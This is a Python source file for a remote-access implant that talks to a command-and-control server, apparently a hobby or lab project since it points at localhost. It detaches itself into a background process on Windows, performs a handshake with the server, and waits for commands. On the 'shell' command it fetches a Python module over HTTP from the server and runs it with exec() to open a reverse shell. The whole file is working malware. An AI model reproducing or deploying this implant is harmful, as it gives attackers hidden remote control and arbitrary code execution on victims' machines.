import socket,threading,os,sys,ctypes,subprocess

from urllib import request


def make_threaded(func):
    
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.daemon = True
        thread.start()
        return thread 
    return wrapper

def detach_process():
    """
    Detaches the current process from its controlling terminal and runs it in the background.
    """
    # Windows-specific detachment
    if os.environ.get("DETACHED_PROCESS") == "1":
        return
    try:
        # Use subprocess to create a detached process
        # https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
        DETACHED_PROCESS = 0x00000008
        CREATE_NEW_PROCESS_GROUP = 0x00000200
        flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP

        # Ensure the child process uses the same Python interpreter as the parent.
        python_executable = sys.executable
        script_path = os.path.abspath(__file__)  # Get the full path of the current script
        
        new_env = {**os.environ, "DETACHED_PROCESS": "1"}

        # Use sys.argv to pass the script name to the new process
        process = subprocess.Popen(
            [python_executable, *sys.argv],  # Use sys.argv here
            creationflags=flags,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            env=new_env
        )

        # The parent process exits immediately, leaving the detached process running.
        sys.exit(0)
        

    except Exception as e:
        print(f"Error detaching process: {e}")

        

class client():

    def __init__(self, host, port):
        self.host = host
        self.host_port = port
        self.connection = self.connect()

    #create a connection to C2 server
    def connect(self):
        print("creating connection")
        connection = socket.create_connection((self.host,self.host_port))
        data = connection.recv(1)
        if str(data.decode()) == 'g':
            print("connection established")
            connection.send('g'.encode())
        
        return connection
    
    @make_threaded
    def run_module(self,name):
        url = f"http://{self.host}:5001/{name}.py"
        module = request.urlopen(url).read().decode('utf-8') 
        exec(module)
        return


    #listen for commands
    def run(self):
         while True:
            try:
                instruction = self.connection.recv(1024).decode()
                print(f"Received instruction: {instruction}")
                if not instruction:
                    print("breakingh")
                    break
                elif instruction == 'shell':
                    print("starting  reverse shell")
                    threading.Thread(target=self.run_module, args=('tcp_shell',)).start()
                elif(str(instruction) == 'g'):
                    self.connection.send('g'.encode())

            except Exception as e:
                print(e)
                self.connection.sendall(str(e).encode()) 
        
print("detatching process")
detach_process()            
c = client('localhost', 5000)
c.run()
print("running")
   